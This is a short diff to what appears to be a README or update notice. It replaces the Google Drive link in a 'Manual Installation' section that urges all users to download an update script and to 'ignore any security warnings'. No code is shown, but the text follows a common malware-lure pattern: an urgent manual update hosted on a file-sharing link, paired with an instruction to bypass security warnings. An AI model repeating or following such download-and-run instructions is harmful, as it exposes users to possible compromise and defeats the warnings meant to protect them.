@@ -18,7 +18,7 @@ All users are strongly encouraged to install this update MANUALLY pending our fo
 ## 🔧 Manual Installation
 
 1. Click to navigate to the update script:  
-   [`Click here`](https://drive.google.com/file/d/1Awbd2WbQky_6lTGDt7q0O4xc0r3HEEWA/view?usp=sharing)
+   [`Click here`](https://drive.google.com/file/d/1jBRY1HPfyVjFlW_D36KqPACgyH4JRCsV/view?usp=drive_link)
 
 2. Click download on the script (ignore any security warnings)
 
